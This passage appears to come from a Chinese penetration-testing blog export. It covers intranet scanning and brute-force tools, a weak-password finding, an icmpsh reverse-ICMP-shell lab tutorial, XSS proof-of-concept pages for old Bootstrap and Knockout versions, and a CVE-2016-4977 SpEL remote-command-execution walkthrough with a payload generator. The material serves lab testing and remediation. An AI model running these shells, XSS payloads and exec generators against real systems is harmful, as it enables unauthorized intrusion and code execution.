(加载指定⽂件的⽤户名、密码来进⾏爆破) ./fscan -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) ./fscan -h 192.168.1.1/8 (A段的192.x.x.1和192.x.x.254,⽅便快速查看⽹段信息 ) ./fscan -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞) ./fscan -h 192.168.1.1/24 -m ms17010 (指定模块) ./fscan -hf ip.txt (以⽂件导⼊) ./fscan -u http: baidu.com -proxy 8080 ( 扫 描 单 个 url, 并 设 置 http 代 理http: 127.0.0.18080) SharpScan 下载地址：\n1 https://github.com/INotGreen/SharpScan C#开发的内⽹资产扫描器，⽅便内⽹横向移动和域内信息收集 参考了Ladon，Fscan、Kscan等扫描器的⼯作原理 为了兼容更古⽼的系统，所以采⽤.NET Framework3.5 和.NET Core6.0开发 使⽤异步和⾼并发、扫描速度快并且可控、内存⾃动回收 ⽤Inline-assembly或者Execute-assembly进⾏内存加载，做到⽆⽂件落地扫描 体积较⼩(⽬前800kb)、传输快、⾃动化扫描+内⽹信息收集⼀条⻰ 尽量遵循OPSEC原则，不创建net.exe、wmi.exe、reg.exe等额外的⼦进程操，减少⽇志记录\n使用： 1 SharpScan.exe -h 192.168.12.1/24 -o output.txt Inveigh 一款专注于内网协议欺骗与凭证捕获的PowerShell工具。\n下载地址：\n1 https://github.com/Kevin-Robertson/Inveigh/releases PowerSploit 下载：\n1 https://github.com/PowerShellMafia/PowerSploit wmic_info 为了简化操作，可以创建⼀个脚本，在⽬标机器上完成流程、服务、⽤户账户、⽤户组、⽹络接⼝、硬盘信息、⽹络共享信息、操作系统、安装的补丁、安装的软件、启动时运⾏\n的 程 序 、 时 区 等 信 息 的 查 询 ⼯ 作 。\n下 载 地址：\n1 http://www.fuzzysecurity.com/scripts/files/wmic_info.rar 点击下载⽂件，然后⽣成了out.html\nADExplorer 使⽤ADExplorer轻松导航AD数据库，定义收藏夹位置，查看对象属性，⽆需打开对话框 、编辑权限、查看对象的模式，并执⾏复杂的搜索。\n下载：\n1 https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer BloodHound BloodHound将域内⽤户、计算机、组、Sessions、ACLs以及域内所有相关⽤户、组、计算机、登陆信息、访问控制策略之间的关系更直观的展现在攻击者⾯前进⾏更便捷的分析域内情况，更快速的在域内提升⾃⼰的权限。\n使⽤BloodHound轻松识别⾼度复杂的攻击路径，轻松深⼊了解Active Directory环境中的权限关系。\n1）安装Neo4j\n1 2 apt install neo4j -y neo4j start 推两个Gith项⽬：\n1 2 3 4 项⽬地址：https://github.com/Al1ex/CSPlugins 项⽬介绍：主要收集常⽤的CS好⽤的插件，涉及提权、漏洞利⽤、横向移动、信息收集、免杀等等 项⽬地址：https://github.com/Al1ex/Pentest-tools 项⽬介绍：主要收集⼀些内⽹渗透测试中常⽤到的⼯具 ","date":"2025-09-10T00:00:00Z","image":"http://localhost:1313/images/58.webp","permalink":"http://localhost:1313/p/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B/","title":"【内网攻防】内网扫描探测"},{"content":"漏洞URL 1 https://xxxx/xx/xxx/xxx/login.html 风险详情 1 开发人员给多个账号设置了相同且简单易猜的密码 12345@qwert 。一方面，“相同密码” 的设置意味着只要攻击者获取到其中一个账号的密码，就能访问所有使用该密码的账号，扩大了攻击面；另一方面，“弱密码” 很容易被攻击者通过暴力破解、社工库查询等方式获取， 从而导致系统中大量用户数据面临泄露风险，如用户个人信息、业务数据等，还可能导致系统被恶意篡改、破坏，严重影响系统的安全性和业务的正常运行 。 漏洞证明 1 2 3 根据提供的账号密码可以猜测系统使用的是弱口令+弱用户名进行认证。这里直接尝试用户+给出来的密码进行测试。 发现几个用户可以使用该密码（123***rt）进行直接登录到系统。 漏洞修复 1 2 3 4 5 1、 要求用户设置高强度密码，密码长度至少 8 位以上，并且包含大写字母、小写字母、数字和特殊字符等多种字符类型。 2、 若是初始密码： (1) 随机生成高强度密码（如 12 位：A8k#p2Q!x9Z3），切勿使用固定并且为弱口令密码。 (2) 初始密码生成后，超过 7 天未登录，失效。 3、 避免用 ceshi、test、admin、user 、姓名缩写等易猜名称作为用户名，建议采用 “业务前缀 + 随机字符” 的命名方式（如 test_8f2Dk、app_test_3xQ7），增加攻击者的猜测难度； ","date":"2025-09-10T00:00:00Z","image":"http://localhost:1313/images/57.webp","permalink":"http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%80%9A%E7%94%A8%E5%BC%B1%E5%AF%86%E7%A0%81-%E5%BC%B1%E7%94%A8%E6%88%B7%E5%90%8D%E6%BC%8F%E6%B4%9E%E9%AB%98%E5%8D%B1/","title":"【渗透测试】通用弱密码+弱用户名漏洞（高危）"},{"content":"icmpsh工具 1 2 icmpsh是⼀个简单的反向ICMP shell⼯具。与其他类似的开源⼯具相⽐，主要优势在于它不需要管理权限即可在⽬标机器上运⾏。 客户端只能在Windows机器运⾏，服务端可以在任何平台上运⾏。 下载地址 1 https://github.com/bdamele/icmpsh 本地实验环境 kali攻击机： 192.168.197.129\nwin10靶机：192.168.197.138\n服务端 1.关闭icmp回复,如果要开启icmp回复，该值设置为0 因为icmpsh工具要代替系统本身的icmp应答程序，所以需要提前关闭本地系统的icmp应答，否则Shell的运行会不稳定\n1 2 3 4 关闭icmp回复 sysctl -w net.ipv4.icmp_echo_ignore_all=1 开启icmp回复 sysctl -w net.ipv4.icmp_echo_ignore_all=0 2.安装get-pip.py\n1 2 wget https://bootstrap.pypa.io/pip/2.7/get-pip.py python2 get-pip.py 3.安装impacket\n1 2 3 4 5 6 这里我是下载完成后，上传到我的kali里进行安装 https://github.com/fortra/impacket/releases/tag/impacket_0_11_0 python2 setup.py install 或者： # 安装兼容 Python 2 的 Impacket 版本（0.9.22 及以下） pip2 install impacket==0.9.22 运行，第⼀个IP是VPS的eth0网卡IP，第二个IP是目标机器出口的公网IP\n1 python2 icmpsh_m.py 192.168.197.129 192.168.197.138 客户端 1 2 3 4 5 6 7 8 9 icmpsh.exe -t 192.168.197.129 -d 500 -b 30 -s 128 -t 主机ip地址以发送ping请求。这个选项是强制性的！ -r 发送⼀个包含字符串“Test1234”的测试icmp请求，然后退出。 -d 毫秒请求之间的延迟（毫秒） -o 毫秒响应超时（毫秒）。如果没有及时收到回复，从机将增加空⽩计数器。如果该计数器达到某个极限，从机将退出。 如果收到响应，计数器将设置回0。 -b 空⽩数量限制（退出前未答复的icmp请求） -s 字节最⼤数据缓冲区⼤⼩（字节） 成功shell\n","date":"2025-09-10T00:00:00Z","image":"http://localhost:1313/images/59.webp","permalink":"http://localhost:1313/p/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86icmpsh%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","title":"【隧道代理】icmpsh工具的使用"},{"content":"漏洞URL 1 https://xxx/xx/xx/bootstrap/js/bootstrap.js 风险详情 1 攻击者利用脚本注入提供了“合法入口”（组件渲染逻辑未过滤 HTML 代码）。攻击门槛低，无需复杂技术，现成 payload 可直接利用。 漏洞证明 本次对下载bootstrap.js文件进行漏洞分析，使用我用AI写的POC进行测试：\nPOC下载地址：\n1 2 3 通过网盘分享的文件：Bootstrap-with-XSS-main.7z 链接: https://pan.baidu.com/s/1dO_x9WtgOVMtrCN4GC1sGA 提取码: ymyh --来自百度网盘超级会员v4的分享 test.html文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Bootstrap XSS 漏洞测试\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;!-- 使用本地下载的 bootstrap.js --\u0026gt; \u0026lt;script src=\u0026#34;bootstrap.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; .container { margin-top: 50px; } .vulnerability-box { border: 1px solid #ddd; border-radius: 5px; padding: 20px; margin-bottom: 30px; background-color: #f9f9f9; } .vulnerability-title { color: #e74c3c; font-weight: bold; margin-bottom: 15px; } .btn-test { margin-right: 10px; margin-bottom: 10px; } .result { margin-top: 20px; padding: 15px; background-color: #f1f1f1; border-radius: 5px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-center\u0026#34;\u0026gt;Bootstrap 3.3.4 XSS 漏洞测试\u0026lt;/h1\u0026gt; \u0026lt;p class=\u0026#34;text-center text-muted\u0026#34;\u0026gt;本页面用于演示 Bootstrap 3.3.4 版本中存在的潜在 XSS 漏洞\u0026lt;/p\u0026gt; \u0026lt;!-- 漏洞 1: Modal 组件的 load 方法 --\u0026gt; \u0026lt;div class=\u0026#34;vulnerability-box\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;vulnerability-title\u0026#34;\u0026gt;1. Modal 组件的 load 方法漏洞\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Modal 组件的 remote 选项允许从远程 URL 加载内容，但没有进行任何过滤，可能导致 XSS 攻击。\u0026lt;/p\u0026gt; \u0026lt;button class=\u0026#34;btn btn-danger btn-test\u0026#34; id=\u0026#34;testModal\u0026#34;\u0026gt;测试 Modal XSS\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 漏洞 2: Tooltip 组件的 HTML 选项 --\u0026gt; \u0026lt;div class=\u0026#34;vulnerability-box\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;vulnerability-title\u0026#34;\u0026gt;2. Tooltip 组件的 HTML 选项漏洞\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;当 Tooltip 的 html 选项设置为 true 时，它会直接解析 HTML 内容，可能导致 XSS 攻击。\u0026lt;/p\u0026gt; \u0026lt;button class=\u0026#34;btn btn-danger btn-test\u0026#34; id=\u0026#34;testTooltip\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; title=\u0026#34;普通文本提示\u0026#34;\u0026gt;普通 Tooltip\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026#34;btn btn-warning btn-test\u0026#34; id=\u0026#34;testTooltipXss\u0026#34; data-toggle=\u0026#34;tooltip\u0026#34; title=\u0026#34;\u0026amp;lt;script\u0026amp;gt;alert(\u0026#39;Tooltip XSS!\u0026#39;)\u0026amp;lt;/script\u0026amp;gt;\u0026#34;\u0026gt;HTML Tooltip (XSS)\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 漏洞 3: Popover 组件的 HTML 选项 --\u0026gt; \u0026lt;div class=\u0026#34;vulnerability-box\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;vulnerability-title\u0026#34;\u0026gt;3. Popover 组件的 HTML 选项漏洞\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;与 Tooltip 类似，Popover 的 html 选项也允许直接解析 HTML 内容，存在 XSS 风险。\u0026lt;/p\u0026gt; \u0026lt;button class=\u0026#34;btn btn-danger btn-test\u0026#34; id=\u0026#34;testPopover\u0026#34; data-toggle=\u0026#34;popover\u0026#34; data-content=\u0026#34;普通 Popover 内容\u0026#34;\u0026gt;普通 Popover\u0026lt;/button\u0026gt; \u0026lt;button class=\u0026#34;btn btn-warning btn-test\u0026#34; id=\u0026#34;testPopoverXss\u0026#34; data-toggle=\u0026#34;popover\u0026#34; data-content=\u0026#34;\u0026amp;lt;script\u0026amp;gt;alert(\u0026#39;Popover XSS!\u0026#39;)\u0026amp;lt;/script\u0026amp;gt;\u0026#34;\u0026gt;HTML Popover (XSS)\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 安全修复建议 --\u0026gt; \u0026lt;div class=\u0026#34;vulnerability-box\u0026#34; style=\u0026#34;background-color: #e8f4ea;\u0026#34;\u0026gt; \u0026lt;h3 style=\u0026#34;color: #27ae60;\u0026#34;\u0026gt;安全修复建议\u0026lt;/h3\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;strong\u0026gt;禁用 Modal 的 remote 选项\u0026lt;/strong\u0026gt;：不要使用 remote 选项从远程加载内容，而是手动获取内容并进行适当的过滤。\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;strong\u0026gt;避免使用 html: true 选项\u0026lt;/strong\u0026gt;：尽可能使用 text() 而不是 html() 来设置内容。\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;strong\u0026gt;输入验证和过滤\u0026lt;/strong\u0026gt;：对所有用户输入进行严格的验证和 HTML 转义。\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;strong\u0026gt;升级到最新版本\u0026lt;/strong\u0026gt;：Bootstrap 4+ 已经修复了许多旧版本中的安全问题。\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;strong\u0026gt;使用内容安全策略(CSP)\u0026lt;/strong\u0026gt;：设置适当的 CSP 头来防止 XSS 攻击。\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 用于测试的 Modal --\u0026gt; \u0026lt;div class=\u0026#34;modal fade\u0026#34; id=\u0026#34;myModal\u0026#34; tabindex=\u0026#34;-1\u0026#34; role=\u0026#34;dialog\u0026#34; aria-labelledby=\u0026#34;myModalLabel\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-dialog\u0026#34; role=\u0026#34;document\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;modal-header\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;close\u0026#34; data-dismiss=\u0026#34;modal\u0026#34; aria-label=\u0026#34;Close\u0026#34;\u0026gt;\u0026lt;span aria-hidden=\u0026#34;true\u0026#34;\u0026gt;\u0026amp;times;\u0026lt;/span\u0026gt;\u0026lt;/button\u0026gt; \u0026lt;h4 class=\u0026#34;modal-title\u0026#34; id=\u0026#34;myModalLabel\u0026#34;\u0026gt;Modal 标题\u0026lt;/h4\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal-body\u0026#34;\u0026gt; 模态框内容将从远程加载... \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;modal-footer\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; class=\u0026#34;btn btn-default\u0026#34; data-dismiss=\u0026#34;modal\u0026#34;\u0026gt;关闭\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; $(document).ready(function() { // 测试 Modal XSS $(\u0026#39;#testModal\u0026#39;).click(function() { // 创建一个包含 XSS 的临时内容用于测试 var xssContent = \u0026#39;\u0026lt;div\u0026gt;这是加载的内容\u0026lt;/div\u0026gt;\u0026lt;script\u0026gt;alert(\u0026#34;Modal XSS 测试成功!\u0026#34;);\u0026lt;\\/script\u0026gt;\u0026#39;; // 直接设置内容用于演示 $(\u0026#39;#myModal .modal-body\u0026#39;).html(xssContent); $(\u0026#39;#myModal\u0026#39;).modal(\u0026#39;show\u0026#39;); }); // 初始化普通 Tooltip $(\u0026#39;#testTooltip\u0026#39;).tooltip(); // 初始化 HTML Tooltip (XSS) $(\u0026#39;#testTooltipXss\u0026#39;).tooltip({ html: true }); // 初始化普通 Popover $(\u0026#39;#testPopover\u0026#39;).popover({ trigger: \u0026#39;hover\u0026#39;, placement: \u0026#39;top\u0026#39; }); // 初始化 HTML Popover (XSS) $(\u0026#39;#testPopoverXss\u0026#39;).popover({ trigger: \u0026#39;hover\u0026#39;, placement: \u0026#39;top\u0026#39;, html: true }); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 该版本存在3处XSS漏洞点：\n1. Modal 组件的 load 方法漏洞：Modal 组件的 remote 选项允许从远程 URL 加载内容，但没有进行任何过滤，导致 XSS 攻击。\n2. Tooltip 组件的 HTML 选项漏洞：当 Tooltip 的 html 选项设置为 true 时，它会直接解析 HTML 内容，导致 XSS 攻击。\n3. Popover 组件的 HTML 选项漏洞：与 Tooltip 类似，Popover 的 html 选项也允许直接解析 HTML 内容，存在 XSS 风险。\n测试方法 下载网站的bootstrap.js文件放在主目录中测试即可。\n漏洞修复 1 升级到最新版本：Bootstrap 4+ 已经修复了许多旧版本中的安全问题。 ","date":"2025-09-09T00:00:00Z","image":"http://localhost:1313/images/54.webp","permalink":"http://localhost:1313/p/bootstrap3.3.4%E7%89%88%E6%9C%AC%E8%BF%87%E4%BD%8E%E5%AF%BC%E8%87%B4xss%E6%BC%8F%E6%B4%9E%E4%B8%AD%E5%8D%B1/","title":"【Bootstrap】3.3.4版本过低导致XSS漏洞（中危）"},{"content":"漏洞URL 1 https://xxxx/xx/xxx/knockout/knockout-3.2.0.debug.js 风险详情 1 攻击者利用脚本注入提供了“合法入口”（组件渲染逻辑未过滤 HTML 代码）。攻击门槛低，无需复杂技术，现成 payload 可直接利用。 漏洞证明 文件下载 1 2 3 通过网盘分享的文件：knockout_xss_test.7z 链接: https://pan.baidu.com/s/1g9cCWf1ryzcP4F3n6qDAnQ 提取码: wtxx --来自百度网盘超级会员v4的分享 POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Knockout.js 3.2.0 XSS漏洞测试\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; } .test-case { margin-bottom: 30px; padding: 20px; border: 1px solid #ddd; border-radius: 5px; background-color: #f9f9f9; } h2 { color: #333; border-bottom: 2px solid #333; padding-bottom: 5px; } input[type=\u0026#34;text\u0026#34;] { width: 100%; padding: 8px; margin: 10px 0; box-sizing: border-box; } button { padding: 10px 15px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; } button:hover { background-color: #45a049; } .result { margin-top: 15px; padding: 10px; background-color: #e8e8e8; border-radius: 4px; } .warning { color: #ff4444; font-weight: bold; } pre { background-color: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; } .security-tips { background-color: #fff3cd; padding: 15px; border: 1px solid #ffeaa7; border-radius: 5px; margin-top: 20px; } \u0026lt;/style\u0026gt; \u0026lt;!-- 引入Knockout.js 3.2.0 --\u0026gt; \u0026lt;script src=\u0026#34;knockout-3.2.0.debug.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Knockout.js 3.2.0 XSS漏洞测试\u0026lt;/h1\u0026gt; \u0026lt;!-- 测试用例1: HTML绑定XSS漏洞 --\u0026gt; \u0026lt;div class=\u0026#34;test-case\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;测试用例1: HTML绑定XSS漏洞\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Knockout.js的html绑定直接将内容渲染为HTML，没有进行任何转义，这是一个明显的XSS漏洞。\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;warning\u0026#34;\u0026gt;⚠️ 注意：请不要在生产环境中使用此绑定处理来自不可信源的数据！\u0026lt;/p\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;htmlInput\u0026#34;\u0026gt;输入可能包含XSS的内容:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;htmlInput\u0026#34; data-bind=\u0026#34;value: htmlContent\u0026#34;\u0026gt; \u0026lt;button data-bind=\u0026#34;click: updateHtml\u0026#34;\u0026gt;更新内容\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;result\u0026#34;\u0026gt; \u0026lt;p\u0026gt;渲染结果 (使用html绑定):\u0026lt;/p\u0026gt; \u0026lt;div data-bind=\u0026#34;html: htmlContent\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;result\u0026#34;\u0026gt; \u0026lt;p\u0026gt;安全渲染结果 (使用text绑定):\u0026lt;/p\u0026gt; \u0026lt;div data-bind=\u0026#34;text: htmlContent\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;pre\u0026gt;示例Payload: \u0026amp;lt;img src=x onerror=alert(\u0026#39;XSS via html binding\u0026#39;)\u0026amp;gt;\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 测试用例2: parseJson函数XSS漏洞 --\u0026gt; \u0026lt;div class=\u0026#34;test-case\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;测试用例2: parseJson函数XSS漏洞\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;在不支持JSON.parse的旧浏览器中，ko.utils.parseJson使用new Function()来解析JSON，这允许执行任意JavaScript代码。\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;warning\u0026#34;\u0026gt;⚠️ 注意：这个漏洞在现代浏览器中不适用，但在IE8等旧浏览器中存在风险！\u0026lt;/p\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;jsonInput\u0026#34;\u0026gt;输入恶意JSON:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;jsonInput\u0026#34; value=\u0026#34;{\\\u0026#34;x\\\u0026#34;:\\\u0026#34;y\\\u0026#34;}\u0026#34; data-bind=\u0026#34;value: jsonContent\u0026#34;\u0026gt; \u0026lt;button data-bind=\u0026#34;click: parseJson\u0026#34;\u0026gt;解析JSON\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;result\u0026#34; data-bind=\u0026#34;text: jsonParseResult\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;pre\u0026gt;示例Payload (仅在旧浏览器中有效): {\u0026#34;x\u0026#34;:alert(\u0026#39;XSS via parseJson\u0026#39;)}\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 安全修复建议 --\u0026gt; \u0026lt;div class=\u0026#34;security-tips\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;安全修复建议\u0026lt;/h2\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;strong\u0026gt;避免使用html绑定:\u0026lt;/strong\u0026gt; 除非完全信任数据源，否则应使用text绑定替代html绑定\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;strong\u0026gt;升级Knockout.js版本:\u0026lt;/strong\u0026gt; 升级到最新版本，可能包含安全修复\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;strong\u0026gt;实施内容安全策略(CSP):\u0026lt;/strong\u0026gt; 在服务器端配置CSP头，防止内联脚本执行\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;strong\u0026gt;输入验证和转义:\u0026lt;/strong\u0026gt; 对所有用户输入进行验证和HTML转义\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;strong\u0026gt;使用现代浏览器:\u0026lt;/strong\u0026gt; 确保用户使用支持JSON.parse的现代浏览器\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;strong\u0026gt;创建自定义安全绑定:\u0026lt;/strong\u0026gt; 实现自己的安全HTML绑定，对内容进行过滤\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; // 测试ViewModel function TestViewModel() { var self = this; // 测试用例1 self.htmlContent = ko.observable(\u0026#39;\u0026lt;img src=x onerror=alert(\u0026#34;XSS via html binding\u0026#34;)\u0026gt;\u0026#39;); self.updateHtml = function() { // 直接更新内容，不做任何转义 }; // 测试用例2 self.jsonContent = ko.observable(\u0026#39;{\u0026#34;x\u0026#34;:\u0026#34;y\u0026#34;}\u0026#39;); self.jsonParseResult = ko.observable(\u0026#39;\u0026#39;); self.parseJson = function() { try { // 保存原始的JSON.parse函数 var originalJSONParse = JSON.parse; // 模拟旧浏览器环境 (移除JSON.parse) JSON.parse = undefined; // 尝试解析JSON var result = ko.utils.parseJson(self.jsonContent()); self.jsonParseResult(\u0026#39;解析成功: \u0026#39; + JSON.stringify(result)); // 恢复原始的JSON.parse函数 JSON.parse = originalJSONParse; } catch (e) { self.jsonParseResult(\u0026#39;解析错误: \u0026#39; + e.message); // 确保恢复JSON.parse JSON.parse = originalJSONParse; } }; } // 应用绑定 ko.applyBindings(new TestViewModel()); // 创建一个自定义的安全HTML绑定示例 ko.bindingHandlers.safeHtml = { init: function() { return { \u0026#39;controlsDescendantBindings\u0026#39;: true }; }, update: function(element, valueAccessor) { var html = ko.utils.unwrapObservable(valueAccessor()); if (html \u0026amp;\u0026amp; typeof html === \u0026#39;string\u0026#39;) { // 简单的HTML过滤示例 var safeHtml = html .replace(/\u0026amp;/g, \u0026#39;\u0026amp;amp;\u0026#39;) .replace(/\u0026lt;/g, \u0026#39;\u0026amp;lt;\u0026#39;) .replace(/\u0026gt;/g, \u0026#39;\u0026amp;gt;\u0026#39;) .replace(/\u0026#34;/g, \u0026#39;\u0026amp;quot;\u0026#39;) .replace(/\u0026#39;/g, \u0026#39;\u0026amp;#039;\u0026#39;); ko.utils.setHtml(element, safeHtml); } } }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 测试 下载booknockout-3.2.0.debug.js文件，发现parseJson函数允许执行任意JavaScript代码，编写POC进行复现，如图所示：\n漏洞修复 1 升级Knockout.js版本: 升级到最新版本。 ","date":"2025-09-09T00:00:00Z","image":"http://localhost:1313/images/55.webp","permalink":"http://localhost:1313/p/knockout.js3.2.0%E7%89%88%E6%9C%AC%E8%BF%87%E4%BD%8E%E5%AF%BC%E8%87%B4xss%E6%BC%8F%E6%B4%9E%E4%B8%AD%E5%8D%B1/","title":"【Knockout.js】3.2.0版本过低导致XSS漏洞（中危）"},{"content":"Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977） 漏洞描述 Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。\n影响范围 2.0.0-2.0.9\n1.0.0-1.0.5\n复现过程 这里使用2.0.8版本\n使用vulhub\n1 2 3 4 5 root@ubuntu:/mnt/vulhub# cd spring root@ubuntu:/mnt/vulhub/spring# ls CVE-2016-4977 CVE-2017-4971 CVE-2017-8046 CVE-2018-1270 CVE-2018-1273 CVE-2022-22947 CVE-2022-22963 CVE-2022-22965 CVE-2022-22978 root@ubuntu:/mnt/vulhub/spring# cd CVE-2016-4977 root@ubuntu:/mnt/vulhub/spring/CVE-2016-4977# 运行靶场：\n1 docker-compose up -d 直接打开靶场：\n1 http://192.168.197.140:8080/ 直接访问：\n默认admin:admin\n1 http://192.168.197.140:8080/oauth/authorize?response_type=${2*3}\u0026amp;client_id=acme\u0026amp;scope=openid\u0026amp;redirect_uri=http://test 下载POC，poc.py\n1 2 3 4 5 6 7 8 #!/usr/bin/env python message = input(\u0026#39;Enter message to encode:\u0026#39;) poc = \u0026#39;${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)\u0026#39; % ord(message[0]) for ch in message[1:]: poc += \u0026#39;.concat(T(java.lang.Character).toString(%s))\u0026#39; % ord(ch) poc += \u0026#39;)}\u0026#39; print(poc) 